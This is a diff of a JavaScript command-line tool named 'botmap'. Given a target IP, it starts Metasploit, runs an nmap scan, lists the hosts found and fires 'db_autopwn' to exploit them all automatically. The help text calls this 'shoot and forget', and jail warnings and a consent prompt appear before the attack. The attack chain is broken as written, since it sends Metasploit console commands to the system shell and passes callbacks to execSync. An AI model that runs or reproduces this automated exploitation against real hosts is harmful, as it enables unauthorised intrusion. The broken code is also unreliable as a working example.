@@ -34,7 +34,7 @@ function userAuth() {
   console.warn(_safe2.default.warn("Note,that you need the permission of the target's owner !"));
   console.warn(_safe2.default.warn('Are you sure you want to scan and attack: \n' + target));
   console.log(_safe2.default.prompt('Press y to continue'));
-  var input = _promptSync.prompt.prompt();
+  var input = (0, _promptSync.prompt)();
 
   if (input != 'y') {
     console.log(info('Maybe a wise decision..'));
@@ -46,6 +46,7 @@ function userAuth() {
 function exploit(target) {
   console.log(_safe2.default.info('Starting ...'));
   console.warn(_safe2.default.warn('Once again... I hope you now what you are doing...'));
+
   //start postgresql
   (0, _child_process.execSync)('service postgresql start', function (err, stdout, stderr) {
     if (err || stderr) {
@@ -56,6 +57,7 @@ function exploit(target) {
       console.log(_safe2.default.info('started postgresql'));
     }
   });
+
   //start msf
   (0, _child_process.execSync)('msfconsole', function (err, stdout, stderr) {
     if (err || stderr) {
@@ -66,6 +68,8 @@ function exploit(target) {
       console.log(_safe2.default.info('started msf'));
     }
   });
+
+  //switch workspace
   (0, _child_process.execSync)('workspace botmap', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
@@ -76,6 +80,8 @@ function exploit(target) {
       console.log(_safe2.default.info('switched workspace'));
     }
   });
+
+  //performing scan
   console.log(_safe2.default.info('Starting scan...'));
   (0, _child_process.execSync)('db_nmap -sS -sV -sU -n -O ' + target, function (err, stdout, stderr) {
     if (err || stderr) {
@@ -86,6 +92,8 @@ function exploit(target) {
       console.log(_safe2.default.info('scan finished'));
     }
   });
+
+  //host list
   (0, _child_process.execSync)('db_hosts', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
@@ -95,6 +103,8 @@ function exploit(target) {
       console.log(_safe2.default.info('HOST:' + stdout));
     }
   });
+
+  //pawning...
   console.warn(_safe2.default.warn('Note that the following action can bring you to jail ! \n Botmap can not stop the action once it started !'));
   (0, _child_process.execSync)('db_autopwn -p -t -e', function (err, stdout, stderr) {
     if (err || stderr) {
@@ -118,7 +128,7 @@ function setup() {
       console.log(_safe2.default.info('started postgresql'));
     }
   });
-  (0, _child_process.execSync)('service metasploit start', function (err, stdout, stderr) {
+  (0, _child_process.execSync)('msfconsole', function (err, stdout, stderr) {
     if (err || stderr) {
       var error = err || stderr;
       console.error(_safe2.default.error('Could not start msf \n' + error));
@@ -178,11 +188,11 @@ if (userArgs[0] == 'target' || userArgs[0] == '-t') {
   //botmap help | botmap -h
   console.log(_safe2.default.help('------------------------------------------'));
   console.log(_safe2.default.help('botmap [command] [argument] where: '));
-  console.log(_safe2.default.help('command is one of the following\n target [traget ip]: set target, shoot and forget \n about : display the info about botmap \n clean : to clean the temp.json \n help to display this menu '));
+  console.log(_safe2.default.help('command is one of the following\n target [traget ip]: set target, shoot and forget \n about : display the info about botmap  \n help to display this menu '));
   console.log(_safe2.default.help('------------------------------------------'));
 } else if (userArgs[0] == 'setup') {
   //botmap setup
-  setup()
+  setup();
 } else {
   //botmap [wrong args]
   console.error(_safe2.default.red('Unknownen Argument(s)'));
